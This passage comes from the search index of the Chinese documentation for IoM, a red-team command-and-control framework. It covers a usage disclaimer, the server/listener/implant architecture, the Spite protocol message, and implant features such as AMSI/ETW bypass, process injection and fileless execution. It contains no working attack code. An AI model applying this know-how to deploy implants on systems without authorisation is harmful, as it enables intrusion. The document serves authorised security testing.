<p>\u6cd5\u5f8b\u6cd5\u89c4\u8bb8\u53ef\u7684\u5176\u4ed6\u6b63\u5f53\u76ee\u7684\u3002     \u203b \u6211\u4eec\u6073\u8bf7\u7528\u6237\u606a\u5b88\u6cd5\u5f8b\u5e95\u7ebf\uff0c\u5207\u52ff\u7528\u4e8e\u672a\u6388\u6743\u8bbf\u95ee\u3001\u6570\u636e\u7a83\u53d6\u6216\u7cfb\u7edf\u7834\u574f \u3002 </p> </li> </ul> <p>2. \u8d23\u4efb\u4e0e\u98ce\u9669\u63d0\u793a</p> <ul> <li> <p>\u7528\u6237\u5e94\u7406\u89e3\u7f51\u7edc\u5b89\u5168\u5de5\u5177\u7684\u654f\u611f\u6027\uff0c\u81ea\u884c\u8bc4\u4f30\u64cd\u4f5c\u98ce\u9669 \u5e76\u91c7\u53d6\u6570\u636e\u5907\u4efd\u7b49\u9632\u62a4\u63aa\u65bd\uff1b</p> </li> <li> <p>\u56e0\u7528\u6237\u8fdd\u53cd\u6cd5\u5f8b\u6cd5\u89c4\u9020\u6210\u7684\u540e\u679c\uff0c\u5f00\u53d1\u8005 \u4f9d\u6cd5\u4e0d\u627f\u62c5\u8fde\u5e26\u8d23\u4efb\uff08\u53c2\u89c1\u300a\u5211\u6cd5\u300b\u7b2c285\u6761\u53ca\u53f8\u6cd5\u89e3\u91ca\uff09\uff1b</p> </li> <li> <p>\u5f00\u53d1\u8005\u5c06\u6301\u7eed\u4f18\u5316\u5de5\u5177\u5b89\u5168\u6027\uff0c\u4f46\u65e0\u6cd5\u4fdd\u8bc1\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u7684\u7edd\u5bf9\u7a33\u5b9a\u6027\u3002 </p> </li> </ul> <p>3. \u6280\u672f\u5408\u89c4\u627f\u8bfa</p> <p>\u4e3a\u7ef4\u62a4\u6280\u672f\u4f26\u7406\uff0c\u6211\u4eec\u627f\u8bfa\uff1a</p> <ul> <li> <p>\u9879\u76ee\u4ee3\u7801 \u5f00\u6e90\u53ef\u5ba1\u8ba1 \uff0c\u4e0d\u542b\u4efb\u4f55\u9690\u853d\u6076\u610f\u529f\u80fd\uff1b</p> </li> <li> <p>Community\u7248\u672c \u6c38\u4e45\u4fdd\u6301\u65e0\u5bf9\u6297\u6027\u8bbe\u8ba1\uff08\u4e0d\u89c4\u907f\u5b89\u5168\u9632\u62a4\uff09\uff0c\u6240\u6709\u884c\u4e3a\u7279\u5f81\u516c\u5f00\u4e8e <code>malefic.yara</code>\uff1b</p> </li> <li> <p>\u6d89\u53ca\u9ad8\u98ce\u9669\u64cd\u4f5c\u7684\u529f\u80fd\u5df2\u6dfb\u52a0 \u53cc\u91cd\u786e\u8ba4\u673a\u5236 \u3002 </p> </li> </ul> <p>4. \u793e\u533a\u534f\u4f5c\u539f\u5219</p> <ul> <li> <p>\u5982\u53d1\u73b0\u5de5\u5177\u88ab\u7528\u4e8e\u975e\u6cd5\u573a\u666f\uff0c\u6b22\u8fce\u901a\u8fc7 m09ician@gmail.com \u544a\u77e5\uff0c\u6211\u4eec\u5c06\u534f\u52a9\u91c7\u53d6\u5408\u7406\u63aa\u65bd\uff1b</p> </li> <li> <p>\u6536\u5230\u53f8\u6cd5\u673a\u5173\u6b63\u5f0f\u534f\u67e5\u51fd\u4ef6\u65f6\uff0c\u5c06 \u4f9d\u6cd5\u914d\u5408\u63d0\u4f9b\u5fc5\u8981\u4fe1\u606f \uff1b </p> </li> </ul> <p>5. \u6570\u636e\u6536\u96c6\u4e0e\u9690\u79c1\u58f0\u660e</p> <p>\u4e3a\u4e86\u5408\u89c4\u6027\u8981\u6c42\uff0c\u5de5\u5177\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5c06\u9075\u5faa\u6700\u5c0f\u5fc5\u8981\u539f\u5219\u6536\u96c6\u4ee5\u4e0b\u6570\u636e\uff1a</p> <ul> <li>\u57fa\u7840\u8fde\u63a5\u6570\u636e\uff1a\u53d1\u8d77\u8fde\u63a5\u7684\u6e90IP\u5730\u5740\u4ee5\u53ca\u81ea\u52a8\u7f16\u8bd1\u7684implant\u5143\u6570\u636e </li> </ul>"},{"location":"IoM/concept/","title":"IoM \u6838\u5fc3\u6982\u5ff5","text":"<p>IoM\u91c7\u7528\u9ad8\u5ea6\u89e3\u8026\u7684\u5206\u5e03\u5f0f\u67b6\u6784\uff0c\u672c\u6587\u6863\u4ecb\u7ecd\u5404\u4e2a\u6838\u5fc3\u7ec4\u4ef6\u7684\u6982\u5ff5\u548c\u4f5c\u7528\u3002</p> <p>\u4e0e\u5f00\u53d1\u8005\u6307\u5357\u7684\u5173\u7cfb</p> <p>\u672c\u6587\u6863\u4ecb\u7ecd\u6982\u5ff5\u548c\u67b6\u6784\uff0c\u5177\u4f53\u5f00\u53d1\u5b9e\u8df5\u8bf7\u53c2\u8003\u5f00\u53d1\u8005\u8d21\u732e\u6307\u5357</p>"},{"location":"IoM/concept/#\u76f8\u5173\u9879\u76ee","title":"\u76f8\u5173\u9879\u76ee","text":"<p>IoM\u4f5c\u4e3a\u5b8c\u6574\u7684\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\uff0c\u7531\u591a\u4e2a\u76f8\u4e92\u534f\u4f5c\u7684\u9879\u76ee\u7ec4\u6210\u3002</p>"},{"location":"IoM/concept/#\u6838\u5fc3\u9879\u76ee","title":"\u6838\u5fc3\u9879\u76ee","text":"<ul> <li>malice-network: Server/Client/Listener\u6838\u5fc3\u6846\u67b6</li> <li>malefic: Rust\u5b9e\u73b0\u7684\u8de8\u5e73\u53f0Implant</li> <li>proto: gRPC\u901a\u8baf\u534f\u8bae\u5b9a\u4e49</li> </ul>"},{"location":"IoM/concept/#\u63d2\u4ef6\u751f\u6001","title":"\u63d2\u4ef6\u751f\u6001","text":"<ul> <li>mals: \u5b98\u65b9\u63d2\u4ef6\u4ed3\u5e93\u548c\u7d22\u5f15</li> <li>mal-community: \u793e\u533a\u63d2\u4ef6\u5408\u96c6</li> </ul>"},{"location":"IoM/concept/#iom-\u6838\u5fc3\u7ec4\u4ef6","title":"IoM \u6838\u5fc3\u7ec4\u4ef6","text":"<p>IoM\u91c7\u7528\u9ad8\u5ea6\u89e3\u8026\u7684\u5206\u5e03\u5f0f\u67b6\u6784\uff0c\u7531\u4ee5\u4e0b\u6838\u5fc3\u7ec4\u4ef6\u534f\u540c\u5de5\u4f5c\uff1a</p> <pre><code>graph TB\n    subgraph \"\u7528\u6237\u5c42\"\n        Client[\"Client&lt;br/&gt;\u7528\u6237\u4ea4\u4e92\u754c\u9762\"]\n        Mal[\"Mal\u63d2\u4ef6&lt;br/&gt;Lua\u811a\u672c\u6269\u5c55\"]\n    end\n\n    subgraph \"\u63a7\u5236\u5c42\"\n        Server[\"Server&lt;br/&gt;\u6838\u5fc3\u6570\u636e\u5904\u7406\"]\n        EventBus[\"\u4e8b\u4ef6\u603b\u7ebf&lt;br/&gt;\u72b6\u6001\u540c\u6b65\"]\n    end\n\n    subgraph \"\u7f51\u7edc\u5c42\"\n        Listener[\"Listener&lt;br/&gt;\u5206\u5e03\u5f0f\u76d1\u542c\"]\n        Pipeline[\"Pipeline&lt;br/&gt;\u6570\u636e\u7ba1\u9053\"]\n        Parser[\"Parser&lt;br/&gt;\u534f\u8bae\u89e3\u6790\"]\n        Cryptor[\"Cryptor&lt;br/&gt;\u6d41\u5f0f\u52a0\u5bc6\"]\n    end\n\n    subgraph \"\u6267\u884c\u5c42\"\n        Implant[\"Implant&lt;br/&gt;\u76ee\u6807\u6267\u884c\"]\n        Module[\"Module&lt;br/&gt;\u529f\u80fd\u6a21\u5757\"]\n        Addon[\"Addon&lt;br/&gt;\u4e8c\u8fdb\u5236\u7f13\u5b58\"]\n    end\n\n    subgraph \"\u751f\u6001\u5c42\"\n        BOF[\"BOF&lt;br/&gt;CobaltStrike\u517c\u5bb9\"]\n        Armory[\"Armory&lt;br/&gt;Sliver\u751f\u6001\"]\n        Kit[\"Kit&lt;br/&gt;OPSEC\u5de5\u5177\u5305\"]\n    end\n\n    %% \u6838\u5fc3\u901a\u4fe1\u6d41\n    Client -.-&gt;|gRPC| Server\n    Server -.-&gt;|gRPC Stream| Listener\n    Listener -.-&gt;|TCP/HTTP| Implant\n\n    %% \u5185\u90e8\u5173\u8054\n    Server --&gt; EventBus\n    Listener --&gt; Pipeline\n    Pipeline --&gt; Parser\n    Pipeline --&gt; Cryptor\n    Implant --&gt; Module\n    Implant --&gt; Addon\n\n    %% \u63d2\u4ef6\u6269\u5c55\n    Client --&gt; Mal\n    Implant --&gt; BOF\n    Client --&gt; Armory\n    Implant --&gt; Kit\n\n    %% \u72b6\u6001\u540c\u6b65\n    Server -.-&gt;|\u4e8b\u4ef6\u5e7f\u64ad| Client\n    Server -.-&gt;|\u72b6\u6001\u540c\u6b65| Listener\n\n    classDef clientStyle fill:#e3f2fd,stroke:#1976d2,stroke-width:2px\n    classDef serverStyle fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px\n    classDef networkStyle fill:#e8f5e8,stroke:#388e3c,stroke-width:2px\n    classDef implantStyle fill:#fff3e0,stroke:#f57c00,stroke-width:2px\n    classDef ecosystemStyle fill:#fce4ec,stroke:#c2185b,stroke-width:2px\n\n    class Client,Mal clientStyle\n    class Server,EventBus serverStyle\n    class Listener,Pipeline,Parser,Cryptor networkStyle\n    class Implant,Module,Addon implantStyle\n    class BOF,Armory,Kit ecosystemStyle</code></pre>"},{"location":"IoM/concept/#\u901a\u8baf\u6d41\u7a0b","title":"\u901a\u8baf\u6d41\u7a0b","text":"<p>IoM\u7684\u6570\u636e\u6d41\u8f6c\u9075\u5faa\u4e25\u683c\u7684\u8def\u5f84\uff0c\u786e\u4fdd\u5b89\u5168\u548c\u53ef\u63a7\u6027\u3002</p> <pre><code>sequenceDiagram\n    participant C as Client\n    participant S as Server\n    participant L as Listener\n    participant I as Implant\n\n    Note over C,I: 1. \u521d\u59cb\u5316\u8fde\u63a5\n    C-&gt;&gt;S: gRPC\u8fde\u63a5\u5efa\u7acb\n    L-&gt;&gt;S: gRPC Stream\u8fde\u63a5\n    I-&gt;&gt;L: TCP/HTTP Beacon\u8fde\u63a5\n\n    Note over C,I: 2. \u547d\u4ee4\u4e0b\u53d1\n    C-&gt;&gt;S: \u53d1\u9001\u547d\u4ee4\u8bf7\u6c42\n    S-&gt;&gt;S: \u751f\u6210Spite\u6d88\u606f\n    S-&gt;&gt;L: \u8f6c\u53d1Spite (gRPC Stream)\n    L-&gt;&gt;L: Parser\u89e3\u6790 + Cryptor\u52a0\u5bc6\n    L-&gt;&gt;I: \u53d1\u9001\u52a0\u5bc6\u6570\u636e\u5305\n\n    Note over C,I: 3. \u7ed3\u679c\u8fd4\u56de\n    I-&gt;&gt;L: \u8fd4\u56de\u6267\u884c\u7ed3\u679c\n    L-&gt;&gt;L: Cryptor\u89e3\u5bc6 + Parser\u89e3\u6790\n    L-&gt;&gt;S: \u56de\u4f20Spite (gRPC Stream)\n    S-&gt;&gt;S: \u66f4\u65b0Session\u72b6\u6001\n    S-&gt;&gt;C: \u8fd4\u56de\u7ed3\u679c (\u4e8b\u4ef6\u7cfb\u7edf)\n\n    Note over C,I: 4. \u72b6\u6001\u540c\u6b65\n    S-&gt;&gt;C: \u5e7f\u64ad\u72b6\u6001\u66f4\u65b0\u4e8b\u4ef6\n    S-&gt;&gt;L: \u540c\u6b65Session\u72b6\u6001</code></pre>"},{"location":"IoM/concept/#server","title":"Server","text":"<p>\u6570\u636e\u5904\u7406\u548c\u72b6\u6001\u7ba1\u7406\u7684\u6838\u5fc3\u7ec4\u4ef6\u3002</p> <p>\u6838\u5fc3\u804c\u8d23:</p> <ul> <li>\u6240\u6709\u6570\u636e\u7684\u4e2d\u592e\u7ba1\u7406\u548c\u6301\u4e45\u5316</li> <li>\u63d0\u4f9bgRPC\u670d\u52a1\u4f9bClient\u548cListener\u8c03\u7528</li> <li>\u72b6\u6001\u96c6\u5408\u7ba1\u7406\u548c\u4e8b\u4ef6\u5206\u53d1</li> <li>\u4efb\u52a1\u8c03\u5ea6\u548c\u7ed3\u679c\u5904\u7406</li> </ul> <p>\u67b6\u6784\u7279\u70b9:</p> <ul> <li>Client/Listener\u4e2d\u53ea\u4fdd\u7559\u53ea\u8bfb\u526f\u672c</li> <li>\u5185\u5b58\u4e2d\u4fdd\u7559\u5f53\u524d\u5b58\u6d3b\u7684\u6570\u636e</li> <li>\u5386\u53f2\u6570\u636e\u4fdd\u5b58\u5728\u6570\u636e\u5e93\u4e2d</li> </ul> <p>\u72b6\u6001\u7ba1\u7406:</p> \u72b6\u6001\u96c6\u5408 \u7528\u9014 \u8bf4\u660e clients \u7528\u6237\u8fde\u63a5\u7ba1\u7406 \u6b63\u5728\u8fde\u63a5\u7684\u6240\u6709\u7528\u6237 listeners \u76d1\u542c\u5668\u7ba1\u7406 \u6240\u6709Listener\u5b9e\u4f8b jobs \u4efb\u52a1\u7ba1\u9053\u7ba1\u7406 Pipeline\u5b9e\u4f8b(TCP\u3001Website\u7b49) events \u4e8b\u4ef6\u7cfb\u7edf \u8f6e\u8be2\u7528\u6237\u5e76\u5e7f\u64ad\u4e8b\u4ef6 sessions \u4f1a\u8bdd\u7ba1\u7406 \u5b58\u6d3b\u7684Implant\u4f1a\u8bdd <p>RPC\u670d\u52a1: \u901a\u8fc7gRPC\u5b9e\u73b0\u5bf9\u72b6\u6001\u7684CRUD\u64cd\u4f5c\u3001\u4e8b\u4ef6\u901a\u77e5\u3001Listener\u4ea4\u4e92\u7b49\u529f\u80fd\u3002</p> <p>\u4e8c\u8fdb\u5236\u6587\u4ef6</p> <p>v0.0.2\u540eServer\u4e0eListener\u4f7f\u7528\u540c\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u901a\u8fc7\u4e0d\u540c\u914d\u7f6e\u542f\u52a8\u4e0d\u540c\u6a21\u5f0f\u3002</p> <p>\u5f00\u53d1\u6307\u5357</p> <p>Server\u5f00\u53d1\u8be6\u89c1Server\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/concept/#session","title":"Session","text":"<p>Implant\u4f1a\u8bdd\u7684\u72b6\u6001\u7ba1\u7406\u7ed3\u6784\uff0c\u4fdd\u5b58\u5355\u4e2aImplant\u7684\u5b8c\u6574\u4fe1\u606f\u3002</p> <p>\u6838\u5fc3\u529f\u80fd: Session\u662fServer\u4e2d\u6700\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\uff0c\u8d1f\u8d23\u7ba1\u7406\u5355\u4e2aImplant\u7684\u5b8c\u6574\u751f\u547d\u5468\u671f\u3002</p> <p>\u5b50\u72b6\u6001\u96c6\u5408:</p> \u5b50\u72b6\u6001 \u5185\u5bb9 \u7528\u9014 \u57fa\u672c\u4fe1\u606f \u64cd\u4f5c\u7cfb\u7edf\u3001\u8fdb\u7a0b\u4fe1\u606f\u3001\u6743\u9650\u7b49 \u73af\u5883\u8bc6\u522b\u548c\u51b3\u7b56 \u4efb\u52a1\u7ba1\u7406 \u6b63\u5728\u6267\u884c\u7684Task\u5217\u8868 \u4efb\u52a1\u72b6\u6001\u8ddf\u8e2a \u8fde\u63a5\u72b6\u6001 \u7f51\u7edc\u8fde\u63a5\u7684\u903b\u8f91\u72b6\u6001 \u8fde\u63a5\u7ba1\u7406\u548c\u6545\u969c\u6062\u590d \u6570\u636e\u7f13\u5b58 \u5386\u53f2\u6570\u636e\u7f13\u5b58 \u6027\u80fd\u4f18\u5316\u548c\u6570\u636e\u6301\u4e45\u5316 \u6a21\u5757\u4fe1\u606f \u53ef\u7528Module\u5217\u8868 \u529f\u80fd\u80fd\u529b\u7ba1\u7406 \u7ec4\u4ef6\u7ba1\u7406 \u5df2\u52a0\u8f7d\u7684Addon \u5185\u5b58\u7ba1\u7406\u548c\u8d44\u6e90\u63a7\u5236 ... <p>\u5e76\u4e14\u8fd8\u6709\u590d\u6742\u7684\u540c\u6b65\u673a\u5236\uff0c\u5c06\u5728client\u4e0elistener\u4e0a\u7ef4\u62a4session\u7684\u5907\u4efd\u3002 </p>"},{"location":"IoM/concept/#implant","title":"Implant","text":"<p>\u690d\u5165\u7269\uff0c\u5728\u76ee\u6807\u7cfb\u7edf\u4e2d\u6267\u884c\u7684\u6838\u5fc3\u7ec4\u4ef6\u3002</p> <p>https://github.com/chainreactors/malefic/</p> <p>\u4e3b\u8981\u7c7b\u578b:</p> <ul> <li>Malefic: \u529f\u80fd\u5b8c\u6574\u7684\u4e3bImplant\uff0c\u652f\u6301Beacon/Bind\u6a21\u5f0f</li> <li>Pulse: \u8f7b\u91cf\u7ea7\u4e0a\u7ebf\u9a6c\uff0c\u4ec54KB\u5927\u5c0f\uff0c\u7c7b\u4f3cCS\u7684artifact  </li> <li>Prelude: \u591a\u6bb5\u4e0a\u7ebf\u7684\u4e2d\u95f4\u9636\u6bb5\uff0c\u652f\u6301\u6743\u9650\u7ef4\u6301\u7b49</li> </ul> <p>\u6838\u5fc3\u7279\u6027:</p> <ul> <li>\u57fa\u4e8eRust\u5b9e\u73b0\uff0c\u8de8\u5e73\u53f0\u652f\u6301</li> <li>\u6a21\u5757\u5316\u8bbe\u8ba1\uff0c\u52a8\u6001\u52a0\u8f7d\u529f\u80fd</li> <li>\u591a\u79cd\u901a\u8baf\u6a21\u5f0f(Beacon/Bind)</li> <li>OPSEC\u53cb\u597d\u7684\u8bbe\u8ba1</li> </ul> <p>\u6a21\u5757\u7cfb\u7edf: Implant\u901a\u8fc7Module\u7cfb\u7edf\u5b9e\u73b0\u529f\u80fd\u6269\u5c55\uff0c\u652f\u6301\u7f16\u8bd1\u65f6\u9759\u6001\u94fe\u63a5\u548c\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\u3002</p> <p>IoM\u652f\u6301\u591a\u79cd\u683c\u5f0f\u7684\u65e0\u6587\u4ef6\u6267\u884c\uff1a</p> \u7c7b\u578b \u63cf\u8ff0 \u7279\u6027 execute-assembly CLR\u7a0b\u5e8f\u6267\u884c \u652f\u6301bypass AMSI/ETW execute-exe PE\u7a0b\u5e8f\u53cd\u5c04\u6267\u884c \u53c2\u6570\u6b3a\u9a97\u3001\u8fdb\u7a0b\u6ce8\u5165 inline-exe \u5f53\u524d\u8fdb\u7a0b\u5185\u6267\u884c \u65e0\u65b0\u8fdb\u7a0b\u521b\u5efa execute-dll DLL\u53cd\u5c04\u6267\u884c \u652f\u6301sideload execute-shellcode Shellcode\u6267\u884c \u7075\u6d3b\u7684\u6ce8\u5165\u65b9\u5f0f powershell Unmanaged PowerShell \u7ed5\u8fc7PowerShell\u9650\u5236 bof Beacon Object File \u8f7b\u91cf\u7ea7\u529f\u80fd\u6269\u5c55 \u4e0a\u8bc9\u62d3\u5c55\u80fd\u529b\u80fd\u6ee1\u8db3\u7edd\u5927\u90e8\u5206\u573a\u666f\u3002 <p>\u8be6\u7ec6\u6587\u6863</p> <ul> <li>Implant\u5f00\u53d1\u8be6\u89c1Implant\u5f00\u53d1\u6307\u5357</li> <li>\u7f16\u8bd1\u914d\u7f6e\u53c2\u8003Implant\u6784\u5efa\u6307\u5357</li> <li>\u6a21\u5757\u5f00\u53d1\u53c2\u8003Module\u5f00\u53d1\u6587\u6863</li> </ul>"},{"location":"IoM/concept/#client","title":"Client","text":"<p>\u7528\u6237\u4ea4\u4e92\u754c\u9762\uff0c\u8d1f\u8d23\u547d\u4ee4\u8f93\u5165\u548c\u7ed3\u679c\u5c55\u793a\u3002</p> <p>\u67b6\u6784\u7279\u6027:</p> <ul> <li>\u901a\u8fc7gRPC\u4e0eServer\u901a\u8baf</li> <li>\u652f\u6301CLI\u548cGUI\u4e24\u79cd\u6a21\u5f0f</li> <li>\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684\u63d2\u4ef6\u7cfb\u7edf</li> </ul> <p>\u8be6\u7ec6\u6587\u6863</p> <ul> <li>Client\u5f00\u53d1\u8be6\u89c1Client\u5f00\u53d1\u6307\u5357</li> <li>\u4f7f\u7528\u624b\u518c\u53c2\u8003Client\u4f7f\u7528\u6307\u5357</li> <li>Mal\u63d2\u4ef6\u5f00\u53d1\u53c2\u8003Mal\u63d2\u4ef6\u6587\u6863</li> </ul>"},{"location":"IoM/concept/#\u901a\u8baf","title":"\u901a\u8baf","text":"<p>C2\u7684\u672c\u8d28\u5c31\u662f\u5b89\u5168\u7684\u901a\u8baf\u4e0e\u547d\u4ee4\u4e0b\u53d1\u3002\u6211\u4eec\u9700\u8981\u5c06Client/Server/Listener/Implant \u56db\u7aef\u6253\u901a\uff0c \u56e0\u6b64\u901a\u8baf\u8bbe\u8ba1\u662f\u5176\u4e2d\u6838\u5fc3\u3002 </p>"},{"location":"IoM/concept/#spite","title":"Spite","text":"<p>Spite\u662f\u6574\u4e2aIoM\u901a\u8baf\u7684\u6700\u5c0f\u5355\u5143\uff0c\u662fserver/listener \u2194 implant\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u8f7d\u4f53\u3002</p> <p>\u6838\u5fc3\u7279\u6027:</p> <ul> <li>\u57fa\u4e8eProtobuf\u5b9e\u73b0\uff0c\u9ad8\u6548\u5e8f\u5217\u5316</li> <li>\u7edf\u4e00\u7684\u6570\u636e\u4ea4\u6362\u683c\u5f0f</li> <li>\u652f\u6301\u4efb\u52a1\u72b6\u6001\u7ba1\u7406</li> <li>\u6a21\u5757\u5316\u7684body\u8bbe\u8ba1</li> </ul> <p>\u7ed3\u6784\u5b9a\u4e49: <pre><code>message Spite {\n  string name = 1;      // \u76ee\u6807module\u540d\u79f0  \n  uint32 task_id = 2;   // \u4efb\u52a1ID\n  uint32 error = 5;     // \u9519\u8bef\u7801\n  Status status = 6;    // \u4efb\u52a1\u72b6\u6001\n\n  oneof body {          // \u5177\u4f53\u6570\u636e\u8f7d\u4f53\n    Request request = 24;     // \u901a\u7528\u8bf7\u6c42\n    Response response = 25;   // \u901a\u7528\u54cd\u5e94  \n    LoadModule load_module = 31;\n    ExecuteBinary execute_binary = 42;\n    // ... \u66f4\u591a\u6a21\u5757\u7279\u5b9a\u7684\u6d88\u606f\u7c7b\u578b\n  }\n}\n</code></pre></p> <p>\u4f7f\u7528\u573a\u666f:</p> <ul> <li>Client\u901a\u8fc7RPC\u8c03\u7528\u751f\u6210Spite</li> <li>Server\u5c06Spite\u8f6c\u53d1\u7ed9\u5bf9\u5e94Listener  </li> <li>Listener\u901a\u8fc7Parser\u548cCryptor\u5904\u7406Spite</li> <li>Implant\u63a5\u6536Spite\u5e76\u8def\u7531\u5230\u5bf9\u5e94Module\u6267\u884c</li> </ul> <p>\u534f\u8bae\u5b9a\u4e49</p> <p>\u5b8c\u6574\u5b9a\u4e49\u8bf7\u53c2\u8003proto\u4ed3\u5e93\u7684implant.proto </p>"},{"location":"IoM/concept/#listener","title":"Listener","text":"<p>\u5206\u5e03\u5f0f\u76d1\u542c\u670d\u52a1\uff0c\u8d1f\u8d23\u4e0eImplant\u7684\u5b9e\u9645\u901a\u8baf\u3002</p> <p>\u8bbe\u8ba1\u7406\u5ff5: IoM\u7684Listener\u4e0e\u4f20\u7edfC2\u6846\u67b6\u6700\u5927\u7684\u4e0d\u540c\u662f\u5b8c\u5168\u72ec\u7acb\u4e8eServer\uff0c\u53ef\u4ee5\u90e8\u7f72\u5728\u4efb\u610f\u670d\u52a1\u5668\u4e0a\uff0c\u901a\u8fc7gRPC Stream\u4e0eServer\u8fdb\u884c\u5168\u53cc\u5de5\u901a\u8baf\u3002</p> <pre><code>graph LR\n    MSF[\"MSF\\n\u76d1\u542c\u5728\u672c\u673a\"] --&gt; Cobaltstrike[\"Cobaltstrike\\n\u76d1\u542c\u5728Server\"] --&gt; IoM[\"IoM\\n\u5206\u5e03\u5f0f\u76d1\u542c\"]</code></pre> <p>Listener\u5185\u90e8\u67b6\u6784:</p> <pre><code>graph TB\n    subgraph \"Listener\u5b9e\u4f8b\"\n        subgraph \"\u6838\u5fc3\u7ec4\u4ef6\"\n            Core[Listener\u6838\u5fc3&lt;br/&gt;\u7ba1\u7406\u4e0e\u8c03\u5ea6]\n            RPC[gRPC Client&lt;br/&gt;\u4e0eServer\u901a\u8baf]\n        end\n\n        subgraph \"Pipeline\u7ba1\u7406\"\n            TCP[TCP Pipeline&lt;br/&gt;TCP/TLS\u76d1\u542c]\n            HTTP[HTTP Pipeline&lt;br/&gt;HTTP/HTTPS\u670d\u52a1]\n            Bind[Bind Pipeline&lt;br/&gt;\u4e3b\u52a8\u8fde\u63a5]\n            Website[Website Pipeline&lt;br/&gt;\u6587\u4ef6\u6258\u7ba1]\n            Pulse[Pulse Pipeline&lt;br/&gt;\u8f7b\u91cf\u7ea7\u4e0a\u7ebf]\n        end\n\n        subgraph \"\u6570\u636e\u5904\u7406\u5c42\"\n            Parser[Parser&lt;br/&gt;\u534f\u8bae\u89e3\u6790\u5668]\n            Cryptor[Cryptor&lt;br/&gt;\u52a0\u5bc6\u89e3\u5bc6\u5668]\n            Forwarder[Forwarder&lt;br/&gt;\u6570\u636e\u8f6c\u53d1]\n        end\n\n        subgraph \"\u8fde\u63a5\u5c42\"\n            Conn1[\u8fde\u63a51]\n            Conn2[\u8fde\u63a52]\n            ConnN[\u8fde\u63a5N...]\n        end\n\n        Core --&gt; RPC\n        Core --&gt; TCP\n        Core --&gt; HTTP\n        Core --&gt; Bind\n        Core --&gt; Website\n        Core --&gt; Pulse\n\n        TCP --&gt; Parser\n        HTTP --&gt; Parser\n        Bind --&gt; Parser\n        Website --&gt; Parser\n        Pulse --&gt; Parser\n\n        Parser --&gt; Cryptor\n        Cryptor --&gt; Forwarder\n\n        Forwarder --&gt; Conn1\n        Forwarder --&gt; Conn2\n        Forwarder --&gt; ConnN\n    end\n\n    subgraph \"\u5916\u90e8\u8fde\u63a5\"\n        Server[Server&lt;br/&gt;gRPC Stream]\n        Implant1[Implant A]\n        Implant2[Implant B]\n        ImplantN[Implant N]\n    end\n\n    RPC -.-&gt;|\u53cc\u5411\u6d41| Server\n    Conn1 -.-&gt;|\u52a0\u5bc6\u901a\u8baf| Implant1\n    Conn2 -.-&gt;|\u52a0\u5bc6\u901a\u8baf| Implant2\n    ConnN -.-&gt;|\u52a0\u5bc6\u901a\u8baf| ImplantN\n\n    classDef coreStyle fill:#e3f2fd\n    classDef pipelineStyle fill:#e8f5e8\n    classDef dataStyle fill:#fff3e0\n    classDef connStyle fill:#f1f8e9\n\n    class Core,RPC coreStyle\n    class TCP,HTTP,Bind,Website,Pulse pipelineStyle\n    class Parser,Cryptor,Forwarder dataStyle\n    class Conn1,Conn2,ConnN connStyle</code></pre> <p>\u6838\u5fc3\u7279\u6027:</p> <ul> <li>\u5206\u5e03\u5f0f\u90e8\u7f72: \u53ef\u5728\u4efb\u610f\u670d\u52a1\u5668\u4e0a\u90e8\u7f72</li> <li>\u5b8c\u5168\u89e3\u8026: \u4e0eServer\u72ec\u7acb\uff0c\u6545\u969c\u9694\u79bb</li> <li>\u591a\u5f62\u6001\u652f\u6301: \u652f\u6301\u5404\u79cd\u4f2a\u88c5\u548c\u9690\u853d\u5f62\u5f0f</li> <li>\u5b9e\u65f6\u901a\u8baf: \u901a\u8fc7gRPC Stream\u4e0eServer\u53cc\u5411\u901a\u8baf</li> </ul> <p>\u5185\u90e8\u67b6\u6784:</p> <ul> <li>Listener\u6838\u5fc3: \u7ba1\u7406Pipeline\u548c\u4e0eServer\u4ea4\u4e92</li> <li>Pipeline: \u5177\u4f53\u7684\u6570\u636e\u7ba1\u9053\u5b9e\u73b0</li> <li>Forwarder: \u6570\u636e\u8f6c\u53d1\u7ec4\u4ef6</li> <li>Parser: \u534f\u8bae\u89e3\u6790\u5668</li> <li>Cryptor: \u52a0\u5bc6\u89e3\u5bc6\u5668</li> </ul> <p>\u5f00\u53d1\u6307\u5357</p> <p>Listener\u5f00\u53d1\u8be6\u89c1Server\u5f00\u53d1\u6307\u5357</p>"},{"location":"IoM/concept/#pipeline","title":"Pipeline","text":"<p>\u6570\u636e\u7ba1\u9053\uff0cListener\u4e0eImplant/WebShell\u4ea4\u4e92\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <p>\u6982\u5ff5\u8bf4\u660e:</p> <p>Pipeline\u76f8\u5f53\u4e8e\u4f20\u7edfC2\u6846\u67b6\u4e2d\u7684Listener\u6982\u5ff5\uff0c\u4f46IoM\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e86\u5176\u5b9e\u73b0\u3002\u6bcf\u4e2aListener\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2aPipeline\uff0cPipeline\u8d1f\u8d23\u4e0eImplant\u7684\u5177\u4f53\u4ea4\u4e92\u3002</p> <p>\u4e3b\u8981\u7c7b\u578b:</p> \u7c7b\u578b \u7528\u9014 \u72b6\u6001 TCP/TLS \u76d1\u542cTCP\u7aef\u53e3\uff0c\u9ed8\u8ba4\u914d\u7f6e \u2705 \u7a33\u5b9a HTTP/HTTPS HTTP\u534f\u8bae\u901a\u8baf \ud83d\udee0\ufe0f \u5f00\u53d1\u4e2d Bind \u4e3b\u52a8\u8fde\u63a5bind\u6a21\u5f0fImplant \u2705 \u7a33\u5b9a Pulse \u8f7b\u91cf\u7ea7Pulse\u4e13\u7528\u7ba1\u9053 \u2705 \u7a33\u5b9a Website \u9759\u6001\u6587\u4ef6\u6258\u7ba1(\u7c7b\u4f3cCS\u7684host) \u2705 \u7a33\u5b9a REM \u6d41\u91cf\u4ee3\u7406\u548c\u8f6c\u53d1\u670d\u52a1 \ud83d\udee0\ufe0f \u8ba1\u5212\u4e2d <p>\u4ea4\u4e92\u6a21\u5f0f:</p> <ul> <li>Beacon\u6a21\u5f0f: 